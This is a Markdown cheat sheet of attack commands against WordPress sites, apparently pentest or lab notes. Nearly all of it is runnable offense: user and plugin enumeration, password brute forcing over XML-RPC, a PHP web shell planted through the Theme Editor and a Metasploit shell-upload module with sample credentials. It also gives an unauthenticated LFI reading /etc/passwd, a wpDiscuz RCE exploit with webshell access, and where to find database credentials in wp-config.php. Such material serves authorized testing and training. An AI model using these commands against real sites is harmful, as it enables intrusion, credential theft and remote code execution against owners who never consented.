# WordPress

## Discovery

```bash
# Version in meta tag
curl -s http://TARGET | grep 'content="WordPress'

# Version in readme
curl -s http://TARGET/readme.html

# Login page
/wp-login.php
/wp-admin/
```

---

## WPScan Enumeration

```bash
# Basic scan
wpscan --url http://TARGET

# Enumerate users
wpscan --url http://TARGET --enumerate u

# Enumerate plugins
wpscan --url http://TARGET --enumerate p

# Enumerate vulnerable plugins
wpscan --url http://TARGET --enumerate vp

# Aggressive plugin detection
wpscan --url http://TARGET --enumerate p --plugins-detection aggressive
```

---

## Brute Force (WPScan)

```bash
# XMLRPC method (faster)
wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://TARGET

# wp-login method
wpscan --password-attack wp-login -t 20 -U admin,john -P passwords.txt --url http://TARGET

# With user list file
wpscan --password-attack xmlrpc -U users.txt -P passwords.txt --url http://TARGET
```

---

## Theme Editor RCE (Authenticated)

1. Login as admin
2. `Appearance → Theme Editor`
3. Select inactive theme (e.g., Twenty Nineteen)
4. Edit `404.php`
5. Add web shell:

```php
system($_GET[0]);
```

6. Access: `http://TARGET/wp-content/themes/twentynineteen/404.php?0=id`

---

## Metasploit RCE

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME john
set PASSWORD firebird1
set RHOSTS TARGET_IP
set VHOST blog.domain.local
set TARGETURI /
run
```

---

## Vulnerable Plugins

### mail-masta LFI (unauthenticated)

```bash
curl http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

### wpDiscuz RCE (CVE-2020-24186)

```bash
python3 wp_discuz.py -u http://TARGET -p /?p=1

# If exploit fails, use uploaded webshell
curl http://TARGET/wp-content/uploads/2021/08/SHELL.php?cmd=id
```

---

## Important Paths

| Path | Description |
|------|-------------|
| `/wp-config.php` | DB credentials |
| `/wp-content/uploads/` | Uploaded files |
| `/wp-content/plugins/` | Plugins |
| `/wp-content/themes/` | Themes |
| `/xmlrpc.php` | XML-RPC API |

---

## Config File Locations

```bash
# Linux
/var/www/html/wp-config.php
/var/www/wordpress/wp-config.php

# Database creds in wp-config.php
define('DB_NAME', 'database_name');
define('DB_USER', 'username');
define('DB_PASSWORD', 'password');
define('DB_HOST', 'localhost');
```
